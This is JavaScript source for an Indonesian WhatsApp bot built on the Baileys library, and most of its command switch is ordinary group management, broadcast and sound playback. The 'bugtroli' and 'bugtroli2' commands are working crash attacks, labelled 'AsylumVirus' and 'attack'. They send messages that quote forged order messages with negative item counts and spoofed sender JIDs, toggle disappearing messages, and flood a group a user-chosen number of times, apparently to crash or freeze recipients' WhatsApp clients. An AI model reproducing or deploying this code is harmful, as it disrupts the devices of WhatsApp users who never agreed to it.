case 'bugtroli2':
if (!isOwner) return reply ('SoKenal?')
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${namabot}`
		        var grousp = await aldi.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        aldi.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${namabot}`,
						"orderTitle": `${namaowner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        aldi.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${namabot}`,
						"orderTitle": `${namaowner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugtroli':
              if (!isOwner) return reply ('LuOwner?')
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
aldi.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: ofrply,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
aldi.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
				case 'bc':
				if (!isOwner) return reply (' khusus owners bot')
				if (args.length < 1) return reply('.......')
					anu = await aldi.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						kon = await aldi.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							aldi.sendMessage(_.jid, kon, image, {caption: `😎________😎\n\n${body.slice(4)}`})
						}
						reply('_succes broadcast_ ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `😎 BROADCAST BOT😎\n\n${body.slice(4)}`)
						}
						reply('_succes broadcast_ ')
					}
					break

			   	case 'setpp': 
                        if (!isGroup) return reply(aml.groupo)
                       if (!isGroupAdmins) return reply(aml.admin)
                        if (!isBotGroupAdmins) return reply(aml.badmin)
                       media = await aldi.downloadAndSaveMediaMessage(mek)
                         await aldi.updateProfilePicture (from, media)
                        reply('[SUKSES] Mengganti icon grub')
					break						
				case 'add':
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (!isBotGroupAdmins) return reply(aml.badmin)
					if (args.length < 1) return reply('Yang mau di add jin ya?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						aldi.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
					case 'setiinggrup':
					case 'grup':
					case 'group':
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (!isBotGroupAdmins) return reply(aml.badmin)
					list = [{title: `Mau setting grup Apa kak`,
                    rows: [
                       {
                        title: `Membuka Grup`,
                        description: `*Bot akan Membuka Grup*`,
                         rowId: `${prefix}buka`
                      },{
                        title: `Menutup Grup`,
                        description: `*Bot akan Menutup Grup*`,
                        rowId: `${prefix}tutup`
                      },{
                        title: `qrgopay`,
                        description: `*Scan Qr Gopay*`,
                        rowId: `${prefix}qrgopay`
                     },{
                        title: `Matiikan Antilink`,
                        description: `*Nonaktifkan Antilink*`,
                        rowId: `${prefix}antilinkgroup disable`
                     },{
                        title: `Aktifkan Welcome`,
                        description: `*Mengaktifkan Welcome grup*`,
                        rowId: `${prefix}welcome enable`
                    },{
                        title: `Mematiian Welcome`,
                        description: `*Nonaktifkan Welcome grup*`,
                        rowId: `${prefix}welcome disable`
                      }
                    ]
                   }]
               listmsg(from, `Buka Atau Tutup Grup`, `Pilih Ekstensi Anda Disini👇👇`, list)
               p
               break
              case 'buka':
				       if (!isGroup) return reply(aml.groupo)
					   if (!isGroupAdmins) return reply(aml.admin)
					    if (!isBotGroupAdmins) return reply(aml.badmin)
					    reply(`BERHASIL MEMBUKA GROUP`)
						aldi.groupSettingChange(from, GroupSettingChange.messageSend, false)
				break
				       case 'tutup':
				        if (!isGroup) return reply(aml.groupo)
					   if (!isGroupAdmins) return reply(aml.admin)
					    if (!isBotGroupAdmins) return reply(aml.badmin)
                       reply(`BERHASIL MENUTUP GROUP`)
						aldi.groupSettingChange(from, GroupSettingChange.messageSend, true)
					break      
            case 'admin':
            case 'owner':
            case 'creator':
                 // const none = fs.readFileSync('./mp3/cantik.m4a');
                  aldi.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, {quoted: fkatalok})
                  aldi.sendMessage(from,'Tuh kontak owner ku >_< ,Jangan Lupa Save Ya (>)',MessageType.text, { quoted: fkatalok} )
                  //aldi.sendMessage(from,none, MessageType.audio, { quoted: fkontak, mimetype: 'audio/mp4', ptt:true})
                  break
		break    
           	case 'setname':
                if (!isGroup) return reply(aml.groupo)
			    if (!isGroupAdmins) return reply(aml.admin)
				if (!isBotGroupAdmins) return reply(aml.badmin)
                aldi.groupUpdateSubject(from, `${body.slice(9)}`)
                aldi.sendMessage(from, 'Succes, Ganti Nama Grup', text, {quoted: fkontak})
					break
                case 'setdesc':
                if (!isGroup) return reply(aml.groupo)
			    if (!isGroupAdmins) return reply(aml.admin)
				if (!isBotGroupAdmins) return reply(aml.badmin)
                aldi.groupUpdateDescription(from, `${body.slice(9)}`)
                aldi.sendMessage(from, 'Succes, Ganti Deskripsi Grup', text, {quoted: fkontak})
					break
           				case 'demote':                     
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (!isBotGroupAdmins) return reply(aml.badmin)
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				    if (mentioned.length > 1) {
                teks = ''
                for (let _ of mentioned) {
                teks += `Perintah diterima, menurunkan jadi admin group :\n`
                teks += `@_.split('@')[0]`
                }
                mentions(teks, mentioned, true)
                aldi.groupDemoteAdmin(from, mentioned)
                } else{
						mentions(`Perintah diterima, menurunkan @${mentioned[0].split('@')[0]} jadi admin group`, mentioned, true)
                        aldi.groupDemoteAdmin(from, mentioned)
						}
					break
				case 'promote':
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (!isBotGroupAdmins) return reply(aml.badmin)
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
			  if (mentioned.length > 1) {
                teks = ''
                for (let _ of mentioned) {
                teks += `Selamat 🥳 Anda naik menjadi admin group 🎉 :\n`
                teks += `@_.split('@')[0]`
                }
                mentions(teks, mentioned, true)
                aldi.groupMakeAdmin(from, mentioned)
                } else {
                mentions(`Selamat 🥳 @${mentioned[0].split('@')[0]} Anda naik menjadi admin group 🎉`, mentioned, true)
                aldi.groupMakeAdmin(from, mentioned)
                }
                break
                    case 'setlimit':
		            case 'addlimit':
					if (args.length < 1) return
					if (!isOwner) return reply(aml.ownerb)
					if (isNaN(args[0])) return reply('limit harus angka')
                    limitawal = args[0]
					reply(`Limit berhasil di ubah menjadi : ${limitawal}`)
					break 	
					case 'setvhtear':
		            case 'setapikeyvhtear':
					if (args.length < 1) return
					if (!isOwner) return reply(aml.ownerb)
                    apivhtear = args[0]
					reply(`Apikey vhtear berhasil di ubah menjadi : ${apivhtear}`)
					break
                    case 'setlolhuman':
		            case 'setapikeylolhuman':
					if (args.length < 1) return
					if (!isOwner) return reply(aml.ownerb)
                    lolhuman = args[0]
					reply(`Apikey LolHuman berhasil di ubah menjadi : ${lolhuman}`)
					break 
		            case 'setnamabot':
					if (args.length < 1) return
					if (!isOwner) return reply(aml.ownerb)
                    namabot = args[0]
					reply(`Nama Bot berhasil di ubah menjadi : ${namabot}`)
					break 		 		
					case 'setonlydev':
		            case 'setapikeyonlydev':
					if (args.length < 1) return
					if (!isOwner) return reply(aml.ownerb)
                    onlydev = args[0]
					reply(`Apikey OnlyDev berhasil di ubah menjadi : ${onlydev}`)
					break 
                      case 'tambah':
                      try{		
                      if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (!isBotGroupAdmins) return reply(aml.badmin)
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				   quotedis = mek.message.extendedTextMessage.contextInfo.participant
                    aldi.groupAdd(from, [num])
                   reply ('sukses gan')
                } catch (e) {
                console.log('Error :', e)
                reply('Gagal menambahkan target, mungkin karena di private')
                }
                 break
					 case 'kick':
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (!isBotGroupAdmins) return reply(aml.badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 ??𝗮𝗻𝗴 ??𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				   quotedis = mek.message.extendedTextMessage.contextInfo.participant
				  await aldi.groupRemove(from, [quotedis])
				  reply(`*Emang Enak di Kick?*`)
				 break
				case 'listadmin':
					if (!isGroup) return reply(aml.groupo)
					teks = `List admin of group ${groupMetadata.subject}\n𝗧𝗼𝘁𝗮𝗹 : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
		//no group feature
		case 'mutual':
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
                if (isGroup) return reply( 'Command ini tidak bisa digunakan di dalam grup!')
                anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
                await reply('Looking for a partner...')
                await reply(`wa.me/${anug}`)
                await reply( `Partner found: 🙉\n${prefix}next — find a new partner`)
           	break
		case 'next':
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
                if (isGroup) return reply( 'Command ini tidak bisa digunakan di dalam grup!')
                anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
                await reply('Looking for a partner...')
                await reply(`wa.me/${anug}`)
                await reply( `Partner found: 🙉\n${prefix}next — find a new partner`)
        	break
				case 'toimg':
				  if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (!isQuotedSticker) return reply('Reply/tag sticker !')
					reply (aml.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(ind.stikga())
						huu = fs.readFileSync(ran)
						aldi.sendMessage(from, huu, image, {quoted: ftoko, caption: 'tuh dh jadi '})
						fs.unlinkSync(ran)
					})
					await limitAdd(sender)
					break
				case 'simih':
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (args.length < 1) return reply('Pilih enable atau disable udin!')
					if (args[0] === 'enable') {
						if (isSimi) return reply('SUDAH AKTIF !!!')
						samih.push(from)
						fs.writeFileSync('./database/bot/simi.json', JSON.stringify(samih))
						reply('❬ SUKSES ❭ MENGAKTIFKAN FITUR SIMI DI GRUB INI')
		     } else if (args[0] === 'disable') {
						samih.splice(from, 1)
						fs.writeFileSync('./database/bot/simi.json', JSON.stringify(samih))
						reply('❬ SUKSES ❭ MENONAKTIFKAN FITUR SIMI DI GRUB INI')
					} else {
						reply(ind.satukos())
					}
					break
				case 'nsfw':
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (args.length < 1) return reply('Boo :𝘃')
					if (args[0] === 'enable') {
						if (isNsfw) return reply(' sudah aktif  !!')
						nsfw.push(from)
						fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
						reply('❬ SUKSES ❭ Mengaktifkan NSFW di grub ini')
			   } else if (args[0] === 'disable') {
						nsfw.splice(from, 1)
						fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
						reply('❬ SUKSES ❭ Menonaktifkan NSFW di grub ini')
					} else {
						reply(ind.satukos())
					}
					break
                case 'leveling':
                if (!isGroup) return reply(aml.groupo)
                if (!isGroupAdmins) return reply(aml.admin)
                if (args.length < 1) return reply('Boo :??')
                if (args[0] === 'enable') {
                    if (isLevelingOn) return reply('fitur level sudah aktif sebelum nya')
                    _leveling.push(from)
                    fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                     reply(ind.lvlon())
                } else if (args[0] === 'disable') {
                    _leveling.splice(from, 1)
                    fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                     reply(ind.lvloff())
                } else {
                    reply(ind.satukos())
                }
					break
				case 'welcome':
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (args.length < 1) return reply('Pilih enable atau disable udin!')
					if (args[0] === 'enable') {
						if (isWelkom) return reply('SUDAH AKTIF !!!')
						welkom.push(from)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUKSES ❭ Mengaktifkan fitur Welcome/Left di grub ini')
		       } else if (args[0] === 'disable') {
						welkom.splice(from, 1)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUKSES ❭ Menonaktifkan Welcome/Left di grub ini')
					} else {
						reply(ind.satukos())
					}
					break
					case 'sound1':
satu = fs.readFileSync('./sound/sound1.mp3');
aldi.sendMessage(from, satu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound2':
dua = fs.readFileSync('./sound/sound2.mp3');
aldi.sendMessage(from, dua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound3':
tiga = fs.readFileSync('./sound/sound3.mp3');
aldi.sendMessage(from, tiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound4':
empat = fs.readFileSync('./sound/sound4.mp3');
aldi.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound5':
lima = fs.readFileSync('./sound/sound5.mp3');
aldi.sendMessage(from, lima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound6':
enam = fs.readFileSync('./sound/sound6.mp3');
aldi.sendMessage(from, enam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound7':
tujuh = fs.readFileSync('./sound/sound7.mp3');
aldi.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound8':
lapan = fs.readFileSync('./sound/sound8.mp3');
aldi.sendMessage(from, lapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound9':
bilan = fs.readFileSync('./sound/sound9.mp3');
aldi.sendMessage(from, bilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound10':
puluh = fs.readFileSync('./sound/sound10.mp3');
aldi.sendMessage(from, puluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound11':
belas = fs.readFileSync('./sound/sound11.mp3');
aldi.sendMessage(from, belas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound12':
duabelas = fs.readFileSync('./sound/sound12.mp3');
aldi.sendMessage(from, duabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound13':
tgabelas = fs.readFileSync('./sound/sound13.mp3');
aldi.sendMessage(from, tgabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound14':
emptbls = fs.readFileSync('./sound/sound14.mp3');
aldi.sendMessage(from, emptbls, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound15':
lmabelas = fs.readFileSync('./sound/sound15.mp3');
aldi.sendMessage(from, lmabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound16':
enembelas = fs.readFileSync('./sound/sound16.mp3');
aldi.sendMessage(from, enembelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound17':
tjhbelas = fs.readFileSync('./sound/sound17.mp3');
aldi.sendMessage(from, tjhbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
case 'sound18':
lapanbelas = fs.readFileSync('./sound/sound18.mp3');
aldi.sendMessage(from, lapanbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound19':
bilanbelas = fs.readFileSync('./sound/sound19.mp3');
aldi.sendMessage(from, bilanbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound20':
duapuluh = fs.readFileSync('./sound/sound20.mp3');
aldi.sendMessage(from, duapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound21':
duaatu = fs.readFileSync('./sound/sound21.mp3');
aldi.sendMessage(from, duaatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound22':
duapuluh = fs.readFileSync('./sound/sound22.mp3');
aldi.sendMessage(from, duapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound23':
duapuluh = fs.readFileSync('./sound/sound23.mp3');
aldi.sendMessage(from, duapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound24':
duapuluh = fs.readFileSync('./sound/sound24.mp3');
aldi.sendMessage(from, duapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound25':
dualima = fs.readFileSync('./sound/sound25.mp3');
aldi.sendMessage(from, dualima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound26':
duaenum = fs.readFileSync('./sound/sound26.mp3');
aldi.sendMessage(from, duaenum, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound27':
duatjh = fs.readFileSync('./sound/sound27.mp3');
aldi.sendMessage(from, duatjh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound28':
dualapan = fs.readFileSync('./sound/sound28.mp3');
aldi.sendMessage(from, dualapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound29':
duabilan = fs.readFileSync('./sound/sound29.mp3');
aldi.sendMessage(from, duabilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound30':
duapulu = fs.readFileSync('./sound/sound30.mp3');
aldi.sendMessage(from, duapulu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound31':
duapulu = fs.readFileSync('./sound/sound31.mp3');
aldi.sendMessage(from, duapulu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound32':
duapulu = fs.readFileSync('./sound/sound32.mp3');
aldi.sendMessage(from, duapulu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound33':
duapulu = fs.readFileSync('./sound/sound33.mp3');
aldi.sendMessage(from, duapulu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound34':
duapulu = fs.readFileSync('./sound/sound34.mp3');
aldi.sendMessage(from, duapulu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound35':
duapulu = fs.readFileSync('./sound/sound35.mp3');
aldi.sendMessage(from, duapulu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
				default:
		if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[PESAN DARI ALDI  ]', 'cyan'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[PESAN DARI ALDI   ]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[PESAN DARI ALDI    ]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[PESAN DARI ALDI  ]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[PESAN DARI ALDI  ]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[PESAN DARI ALDI ]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[PESAN DARI ALDI  ]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[PESAN DARI ALDI ]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[PESAN DARI ALDI  ]', 'cyan'), color('Bentar lagi maghrib kak, Sabar ya kak', 'yellow'), color('(😆)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[PESAN DARI ALDI  ]', 'cyan'), color('Alhamdulillah, Dah adzan kak, Puasanya dibatalin dulu kak, Sebelum makan jangan lupa baca doa kak, Setelah makan langsung sholat Maghrib ya kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[PESAN DARI ALDI ]', 'cyan'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi, Sekarang siap-siap dulu buat Sholat Tarawih', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[PESAN DARI ALDI ]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[PESAN DARI ALDI  ]', 'cyan'), color('aldiBot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(😴)', 'white'))
        }
 
			if (budy.includes(`Bot`)) {
                  	oh = fs.readFileSync('./sound/Bot.mp3')
                  aldi.sendMessage(from, oh, audio, {quoted: fkatalok, ptt: true})			
                  break
                  }

     if (budy.includes(`cekprefix`)) {
                  reply(`Prefix Saat Ini ➸ *「 ${prefix} 」*`)
                  }

		if (budy.includes(`Cita`,`cita`)) {
                  	oh = fs.readFileSync('./lib/Cita cita.mp3')
                  aldi.sendMessage(from, oh, audio, {quoted: mek, ptt: true})			
                  break
                  }
        if (budy.includes(`Wibu`)) {
                  	oh = fs.readFileSync('./sound/Wibu.mp3')
                  aldi.sendMessage(from, oh, audio, {quoted: mek, ptt: true})			
                  break
                  }

		//if (budy.includes(`bot`)) {
                //  reply(`『 iya kak😡』`)
                  

		if (budy.includes(`Thanks`)) {
                  reply(`Sama Sama Kak😁`)
                  }

		if (budy.includes(`Makasih`)) {
                  reply(`Sama Sama Kak😁`)
                  }
                }
	if(isGroup && !isCmd && budy != undefined) {
						console.log(budy)
					} else {
						console.log(color('[aldiXennBot]','orange'), ('Command Tidak Ditemukan!!','red'), color(sender.split('@')[0]))
					}
		} catch (e) {
			console.log('blue : %s', color(e, 'red'))
		}
})